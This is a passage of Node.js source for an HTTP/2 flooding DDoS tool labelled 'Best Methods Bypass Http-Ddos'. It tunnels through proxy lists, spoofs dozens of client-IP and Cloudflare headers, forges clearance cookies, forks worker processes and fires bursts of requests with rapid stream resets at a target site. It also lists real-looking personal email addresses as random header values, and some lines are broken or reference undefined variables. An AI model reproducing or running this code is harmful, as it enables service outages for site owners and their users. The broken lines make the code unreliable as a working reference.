  'no-cors',
  'same-origin',
  'websocket'
];

var mode1 = mode_header[Math.floor(Math.floor(Math.random() * mode_header.length))];

const site_header = [
  'cross-site',
  'same-origin',
  'same-site',
  'none'
];

var site1 = site_header[Math.floor(Math.floor(Math.random() * site_header.length))];

const sec_ch = [
  "HTTP/1.1",
  "\"Chromium\";v=\"146\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"146\"",
  "\"Chromium\";v=\"147\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"147\"",
  "\"Chromium\";v=\"148\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"148\"",
  "\"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"149\"",
  "\"Chromium\";v=\"150\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"150\"",
  "\"Chromium\";v=\"151\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"151\"",
  "\"Chromium\";v=\"152\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"152\"",
  "\"Chromium\";v=\"153\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"153\"",
  "\"Chromium\";v=\"154\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"154\"",
  "\"Chromium\";v=\"155\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"155\"",
  "\"Chromium\";v=\"156\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"156\"",
  "\"Chromium\";v=\"157\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"157\"",
  "\"Chromium\";v=\"158\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"158\"",
  "\"Chromium\";v=\"159\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"159\"",
  "\"Chromium\";v=\"160\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"160\"",
  "\"Chromium\";v=\"161\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"161\"",
  "\"Chromium\";v=\"162\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"162\"",
  "\"Chromium\";v=\"163\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"163\"",
  "\"Chromium\";v=\"164\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"164\"",
  "\"Chromium\";v=\"165\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"165\"",
  "\"Chromium\";v=\"166\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"166\"",
  "\"Chromium\";v=\"167\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"167\"",
  "\"Chromium\";v=\"168\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"168\"",
  "\"Chromium\";v=\"169\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"169\"",
  "\"Chromium\";v=\"170\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"170\"",
  "\"Chromium\";v=\"171\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"171\"",
  "\"Chromium\";v=\"172\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"172\"",
  "\"Chromium\";v=\"173\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"173\"",
  "\"Chromium\";v=\"174\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"174\"",
  "\"Chromium\";v=\"175\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"175\"",
  "\"Chromium\";v=\"176\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"176\"",
  "\"Chromium\";v=\"177\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"177\"",
  "\"Chromium\";v=\"178\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"178\"",
  "\"Chromium\";v=\"179\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"179\"",
  "\"Chromium\";v=\"180\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"180\"",
  "\"Chromium\";v=\"181\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"181\"",
  "\"Chromium\";v=\"182\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"182\"",
  "\"Chromium\";v=\"183\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"183\"",
  "\"Chromium\";v=\"184\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"184\"",
  "\"Chromium\";v=\"185\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"185\"",
  "\"Chromium\";v=\"186\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"186\"",
  "\"Chromium\";v=\"187\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"187\"",
  "\"Chromium\";v=\"188\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"188\"",
  "\"Chromium\";v=\"189\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"189\"",
  "\"Chromium\";v=\"190\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"190\"",
  "\"Chromium\";v=\"191\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"191\"",
  "\"Chromium\";v=\"192\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"192\"",
  "\"Chromium\";v=\"193\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"193\"",
  "\"Chromium\";v=\"194\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"194\"",
  "\"Chromium\";v=\"195\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"195\"",
  "\"Chromium\";v=\"196\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"196\"",
  "\"Chromium\";v=\"197\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"197\"",
  "\"Chromium\";v=\"198\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"198\"",
  "\"Chromium\";v=\"199\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"199\"",
  "\"Chromium\";v=\"200\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"200\"",
];

var ch1 = sec_ch[Math.floor(Math.floor(Math.random() * sec_ch.length))];

const TE2 = [
  'compress',
  'deflate',
  'gzip',
  'trailers',
  'trailers, deflate;q=0.5',
];

var TE1 = TE2[Math.floor(Math.floor(Math.random() * TE2.length))];

const server2 = [
  'Cloudflare',
  'Apache/2.4.1 (Unix)',
  'Chrome',
  'Firefox',
  'Safari',
  'Opera',
];

var server1 = server2[Math.floor(Math.floor(Math.random() * server2.length))];

const idk = [
  'h2=":443"; ma=2592000;',
  'h2=":443"; ma=2592000; persist=1',
  'h3-25=":443"; ma=3600, h2=":443"; ma=3600',
  'h3=":50781"',
];

var IDK1 = idk[Math.floor(Math.floor(Math.random() * idk.length))];

const country = [
	"A1", "A2", "O1", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU"
	, "AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO"
	, "BQ", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK"
	, "CL", "CM", "CN", "CO", "CR", "CU", "CV", "CW", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO"
	, "DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "GA", "GB"
	, "GD", "GE", "GF", "GG", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW"
	, "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IM", "IN", "IO", "IQ", "IR", "IS"
	, "IT", "JE", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ"
	, "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "ME", "MF"
	, "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX"
	, "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA"
	, "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO"
	, "RS", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN"
	, "SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL"
	, "TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC"
	, "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW",
];

var counter1 = country[Math.floor(Math.floor(Math.random() * country.length))];

const cf_ray1 = [
  "5789b887069beb08-LAX",
  "7fd05951dcaf3901-SJC",
  "84ad0a3edcbd3dbf",
  "84ad0a87baa13dbf",
  "84ad0ac60c943dbf",
  "84ad0b347eb48856",
  "917y2bddbjwbsjj-Lks",
  "230b030023ae2822-SJC",
  "84acfcd95c3218cd",
  "84ad11024d4c7185",
  "84ad12569e613604",
  "84ad1078b8473623",
  "84ad0fbbade61c11",
  "84ad0e033eb7b7b5",
  "84ad0c703be9363d",
  "hdde72vbdjjwbbq91",
  "63h28zbvd9272hvbj",
  "67i1vvvjdwizuxhdb9",
  "8166tcrcfbalopebsj",
  "djdjjsnwnbsb872gvd",
  "816gvdnwosycewcd",
  "91yvrpc93bvwixbfhw",
  "84ad3aa6fe951ea5",
];

var ray1 = cf_ray1[Math.floor(Math.floor(Math.random() * cf_ray1.length))];

const email1 = [
  "user@example.com",
  "alizaz@carolinalemke.com",
  "shay@joomi.co.il",
  "tarzzn@gmail.com",
  "mnrathore7@gmail.com",
  "swarnimayadav29@gmail.com",
  "punkajydv@gmail.com",
];

var email2 = email1[Math.floor(Math.floor(Math.random() * email1.length))];

const clientid1 = [
  "2ec9dfb18c685ab3c38375f3d80f3481.access",
];

var clientid = clientid1[Math.floor(Math.floor(Math.random() * clientid1.length))];

 const ip_spoof = () => {
   const _0xcdc8x15 = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${""}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${""}`;
 };
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var proxies = readLines(args.proxyFile);
 const spoofed = ip_spoof();
 var _0xcdc8x28 = querys[Math.floor(Math.random() * querys.length)];
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
}


 const Socker = new NetSocket();
headers[":method"] = "GET";
headers.GET = ' / HTTP/2';
headers.GET = ' / HTTP/3';
headers.GET = ' / SPDY/3.1';
headers.GET = ' / HTTP/1.2';
headers.GET = ' / HTTP/1.1';
headers.GET = ' / HTTP/1.0';
headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + randstr(15) + _0xcdc8x28 + randstr(15);
headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + randstr(10) + querys[Math.floor(Math.random() * querys.length)] + randstr(10);
headers[":path"] = parsedTarget.path;
headers["origin"] = "https://" + parsedTarget.host;
headers["origin"] = parsedTarget.host;
headers["CF-Worker"] = parsedTarget.host;
headers["cf-worker"] = parsedTarget.host;
headers["Content-Type"] = type1;
headers[":scheme"] = "https";
headers["x-download-options"] = randomHeaders['x-download-options'];
headers["Cross-Origin-Embedder-Policy"] = 'require-corp';
headers["Cross-Origin-Opener-Policy"] = 'same-origin';
headers["CF-Visitor"] = "{\"scheme\":\"https\"}";
headers["cf-visitor"] = "{\"scheme\":\"https\"}";
headers["accept"] = accept1;
headers.accept = randomElement(accept1);
headers["accept-language"] = lang1;
headers["Referrer-Policy"] = policy1;
headers["x-cache"] = chache1;
headers["Content-Security-Policy"] = '<policy-directive>; <policy-directive>';
headers["accept-encoding"] = enco1;
headers.Connection = 'keep-alive';
headers["cache-control"] = chache1;
headers["Date"] = httpTime;
headers["x-frame-options"] = 'SAMEORIGIN';
headers["x-xss-protection"] = xss1;
headers["Cf-Cache-Status"] = "BYPASS";
headers["cf-cache-status"] = "BYPASS";
headers["x-content-type-options"] = "nosniff";
headers["pragma"] = 'no-cache';
headers.pragma = 'no-cache';
headers["sec-ch-ua-platform"] = from1;
headers["upgrade-insecure-requests"] = "1";
headers["sec-fetch-dest"] = dest1;
headers["sec-fetch-mode"] = mode1;
headers["sec-fetch-site"] = site1;
headers["X-Forwarded-Proto"] = HTTPS;
headers["sec-ch-ua"] = ch1;
headers["sec-ch-ua-mobile"] = '?0';
headers["sec-ch-ua-platform"] = from1;
headers["vary"] = 'Accept';
headers["x-trigger-rapid-reset"]= "true";
headers["TE"] = TE1;
headers.pragma = 'no-cache';
headers["set-cookie"] = randomHeaders['set-cookie'];
headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
headers.Cookie = 'cf_clearance=mOvsqA7JGiSddvLfrKvg0VQ4ARYRoOK9qmQZ7xTjC9g-1698947194-0-1-67ed94c7.1e69758c.36e830ad-250.2.1698947194',
headers["CDN-Loop"] = "cloudflare";
headers["cdn-loop"] = "cloudflare";
headers["RateLimit-Limit"] = "10, 10;w=1, 50;w=60, 1000;w=3600, 5000;w=86400";
headers["RateLimit-Limit"] = "10, 10;w=1;burst=1000, 1000;w=3600";
headers["Server"] = server1;
headers["strict-transport-security"] = 'max-age=14400';
headers["access-control-allow-headers"] = '*';
headers["access-control-allow-origin"] = '*';
headers["Content-Encoding"] = enco1;
headers["alt-svc"] = IDK1;
headers["Via"] = spoofed;
headers["X-Forwarded-For"] = spoofed;
headers["X-Forwarded-Host"] = spoofed;
headers["CF-RAY"] = ray1;
headers["cf-ray"] = ray1;
headers["Client-IP"] = spoofed;
headers["Real-IP"] = spoofed;
headers.Referer = Ref;
headers["Referer"] = Ref;
headers["referer"] = Ref;
headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
headers["Referer"] = "https://" + parsedTarget.host + parsedTarget.path;
headers["Cf-Connecting-Ip"] = spoofed;
headers["cf-connecting-ip"] = spoofed;
headers["True-Client-IP"] = spoofed;
headers["true-client-ip"] = spoofed;
headers["CF-IPCountry"] = counter1;
headers["cf-ipcountry"] = counter1;
headers["Cf-Access-Authenticated-User-Email"] = email2;
headers["Cf-Access-Client-Id"] = clientid;
headers[http2.constants.NGHTTP2_CANCEL];
headers[http2.constants.HTTP2_HEADER_PATH] = parsedTarget.path;
headers[http2.constants.HTTP2_HEADER_METHOD] = 'GET';
headers["Akamai-Origin-Hop"] = '1';
headers["CF-Connecting-IP"] = spoofed;
headers["Proxy-Client-IP"] = spoofed;
headers["Source-IP"] = spoofed;
headers["Via"] = spoofed;
headers["WL-Proxy-Client-IP"] = spoofed;
headers["X-BlueCoat-Via"] = spoofed;
headers["X-From-IP"] = spoofed;
headers["X-Original-Hostname"] = spoofed;
headers["X-ProxyMesh-IP"] = spoofed;
headers["X-ProxyUser-IP"] = spoofed;
headers["Z-Forwarded-For"] = spoofed;
headers["Orgion"] = 'null';
headers["Referer"] = Ref
headers["C-IP"] = spoofed;
headers["Client-IP"] = spoofed;
headers["Cluster-Client-IP"] = spoofed;
headers["Cluster-IP"] = spoofed;
headers["Forwarded"] = spoofed;
headers["Forwarded-For"] = spoofed;
headers["Forwarded-Host"] = spoofed;
headers["Forwarded-HTTPS"] = spoofed;
headers["Forwarder"] = spoofed;
headers["Forwarder-For"] = spoofed;
headers["Forwarder-Host"] = spoofed;
headers["Forwarding"] = spoofed;
headers["Forwarding-For"] = spoofed;
headers["Forwarding-Host"] = spoofed;
headers["Host"] = spoofed;
headers["Host-IP"] = spoofed;
headers["IP"] = spoofed;
headers["Origin-IP"] = spoofed;
headers["Originating-IP"] = spoofed;
headers["Proxy"] = spoofed;
headers["Proxy-IP"] = spoofed;
headers["Real-Client-IP"] = spoofed;
headers["Real-IP"] = spoofed;
headers["Remote-Addr"] = spoofed;
headers["Remote-IP"] = spoofed;
headers["Server-IP"] = spoofed;
headers["True-Client"] = spoofed;
headers["True-Client-IP"] = spoofed;
headers["X-C-IP"] = spoofed;
headers["X-Client-IP"] = spoofed;
headers["X-Cluster-Client-IP"] = spoofed;
headers["X-Cluster-IP"] = spoofed;
headers["X-Forwarded"] = spoofed;
headers["X-Forwarded-For"] = spoofed;
headers["X-Forwarded-Host"] = spoofed;
headers["X-Forwarded-HTTPS"] = spoofed;
headers["X-Forwarded-Server"] = spoofed;
headers["X-Forwarder"] = spoofed;
headers["X-Forwarder-For"] = spoofed;
headers["X-Forwarder-Host"] = spoofed;
headers["X-Forwarding"] = spoofed;
headers["X-Forwarding-For"] = spoofed;
headers["X-Forwarding-Host"] = spoofed;
headers["X-Host"] = spoofed;
headers["X-Host-IP"] = spoofed;
headers["X-IP"] = spoofed;
headers["X-Origin"] = spoofed;
headers["X-Origin-Host"] = spoofed;
headers["X-Origin-IP"] = spoofed;
headers["X-Original-For"] = spoofed;
headers["X-Original-Host"] = spoofed;
headers["X-Original-IP"] = spoofed;
headers["X-Originating-Host"] = spoofed;
headers["X-Originating-IP"] = spoofed;
headers["X-Port"] = spoofed;
headers["X-Proxy"] = spoofed;
headers["X-Proxy-IP"] = spoofed;
headers["X-Real-Client-IP"] = spoofed;
headers["X-Real-IP"] = spoofed;
headers["X-Remote-Addr"] = spoofed;
headers["X-Remote-IP"] = spoofed;
headers["X-Server"] = spoofed;
headers["X-Server-IP"] = spoofed;
headers["X-True-Client"] = spoofed;
headers["X-True-Client-IP"] = spoofed;
headers.rstStream(http2.constants.NGHTTP2_CANCEL);
headers.rstStream(http2.constants.NGHTTP2_CLOSED);
// -------------------------------- Best -- Methods --- Bypass --- Http-Ddos ----------------------------------- // @Manusiapendosa1
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED);
               headers.rstStream(http2.constants.NGHTTP2_CANCEL);
               headers.rstStream(http2.constants.NGHTTP2_CLOSED); // rst stream / pursor-reset
// -------------------------------- Best -- Methods --- Bypass --- Http-Ddos ----------------------------------- // @Manusiapendosa1
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const userAgentv2 = new UserAgent();
     var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
     headers[":authority"] = parsedTarget.host
     headers["user-agent"] = uap1;

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: `${parsedTarget.host}:443`,
         timeout: 100
     };


    
    
    setTimeout(function(){
      process.exit(1);
    }, process.argv[3] * 1000);
    
    process.on('uncaughtException', function(er) {
    });
    process.on('unhandledRejection', function(er) {
    });


     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 100000);
         
    const tlsOptions = (() => {
      const useTlsOption2 = Math.random() < 0.5;
      const commonOptions = {
        secure: true,
        ALPNProtocols: ['h3', 'h2'],
        rejectUnauthorized: false,
        servername: parsedTarget.host,
      };
    
      if (useTlsOption2) {
        return {
          ...commonOptions,
          sigals: concu,
          socket: connection,
          ecdhCurve: 'auto',
          minVersion: 'TLSv1.3',
          maxVersion: 'TLSv1.3',
          cipherSuites: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_AES_128_CCM_8_SHA256',
          ],
        };
      } else {
        return {
          ...commonOptions,
          secureOptions:
            crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
            crypto.constants.SSL_OP_NO_TICKET |
            crypto.constants.SSL_OP_NO_COMPRESSION |
            crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
            crypto.constants.SSL_OP_NO_RENEGOTIATION |
            crypto.constants.SSL_OP_SINGLE_DH_USE |
            crypto.constants.SSL_OP_SINGLE_ECDH_USE |
            crypto.constants.SSL_OP_NO_QUERY_MTU,
          ecdhCurve: 'auto',
          ALPNProtocols: ['h3', 'h2'],
          minVersion: 'TLSv1.2',
          maxVersion: 'TLSv1.3',
          cipherSuites: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_AES_128_CCM_8_SHA256',
          ],
        };
      }
    })();
    
const tlsConn = tls.connect(proxyOptions, tlsOptions);
tlsConn.setKeepAlive(true, 60000);

         const numRequests = 200000;
 
         const client = http2.connect(`https://${parsedTarget.host}`, {
             protocol: "https:",
             settings: {
            maxStreams: numRequests,
            MaxFrameSize: 16777215,
            maxHeaderSize: 262144,
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            maxStreams: numRequests,
            MaxFrameSize: 16777215,
            maxHeaderSize: 262144,
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    request.on("response", response => {
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, args.delay); 
         });
 
         client.on("close", () => {
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             connection.destroy();
             return
         });
     });
 }


